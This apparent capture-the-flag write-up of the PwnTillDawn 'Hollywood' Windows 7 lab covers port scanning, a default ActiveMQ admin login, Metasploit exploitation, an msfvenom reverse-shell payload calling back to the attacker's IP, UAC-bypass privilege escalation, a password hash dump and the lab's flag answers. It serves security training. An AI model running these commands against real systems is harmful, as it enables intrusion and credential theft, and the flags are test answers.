---
layout: writeup
title: "Hollywood Machine Writeup"
date: 2025-05-03
platform: PwnTillDawn
---

# Overview
**Target IP**: 10.150.150.219  
**OS**: Windows 7 Ultimate (6.1 Build 7601, Service Pack 1)

## Enumeration

### Port Scanning

Initial all-ports scan revealed multiple open ports:

```bash
$ nmap --min-rate 10000 -p- 10.150.150.219
```

Notable open ports:
- 21 (FTP - FileZilla ftpd 0.9.41 beta)
- 25 (SMTP - Mercury/32)
- 79 (Finger - Mercury/32)
- 80, 443 (HTTP/HTTPS - Apache 2.4.34)
- 8161 (HTTP - Apache ActiveMQ admin)
- Multiple other services including MySQL, MQTT, and various RPC ports

### Service Enumeration

#### Web Services Discovery

1. Found CGI-BIN directory:
   - URL: `http://10.150.150.219/cgi-bin/printenv.pl`
   - Environment variables exposed, including potential sensitive information

2. PHPInfo Page:
   - URL: `http://10.150.150.219/dashboard/phpinfo.php`
   - Discovered **Flag30**: `eb1b768800000e1d2fe1c3100005d2dc8dd10000`

3. ActiveMQ Admin Panel:
   - URL: `http://10.150.150.219:8161/admin`
   - Default credentials worked: `admin:admin`
   - Found **Flag33**: `1480d39af2cd8b0f0bb8c45d331caf7330faa910`

#### User Enumeration via Finger Protocol

```bash
$ finger -s Admin@10.150.150.219
```
Results:
- Admin (Mail System Administrator)
- admin (Mail System Administrator)

## Exploitation

### Initial Access - ActiveMQ Vulnerability

First attempt using ActiveMQ 5.11.1 exploit was unstable. Switched to 5.14.0 exploit:

```bash
# Using Metasploit
$ use multi/http/apache_activemq_upload_jsp
$ set lhost 10.66.67.198
$ set rhosts 10.150.150.219
$ set target 0
$ run
```

Initial system info from meterpreter:
```
Computer        : Hollywood
OS              : Windows 7 6.1 (x86)
Architecture    : x86
System Language : en_US
Meterpreter     : java/windows
```

### Shell Upgrade

Due to limitations with the Java meterpreter, created a native payload:

```bash
# Generate payload
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.67.198 LPORT=4433 -f exe -o reverse.exe

# Set up listener
$ msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.66.67.198; set lport 4433; exploit"
```

## Privilege Escalation

Used local exploit suggester which identified multiple potential vulnerabilities. Successfully escalated privileges using `windows/local/bypassuac_comhijack`.

Post-exploitation system info:
```shell
Computer        : HOLLYWOOD
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
```

### Hash Dump
```shell
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:283c3c4dc5544a73569f35f22a5b1dca:::
User:1000:aad3b435b51404eeaad3b435b51404ee:f9e1a02072d330ddf77ad82cb54d5ec4:::
```

## Flag Collection

1. **Flag30**: `eb1b768800000e1d2fe1c3100005d2dc8dd10000` (from phpinfo page)
2. **Flag33**: `1480d39af2cd8b0f0bb8c45d331caf7330faa910` (from ActiveMQ admin panel)
3. **Flag9**: `b017cd11a8def6b4bae78b0a96a698deda09f033` (Located at C:\Users\User\Documents\FLAG9.txt)

## Key Takeaways

1. Default credentials on admin interfaces can lead to initial access
2. Multiple service vulnerabilities present on the target
3. Windows 7 systems often have multiple privilege escalation vectors
4. Environment information disclosure through CGI scripts can provide valuable reconnaissance data
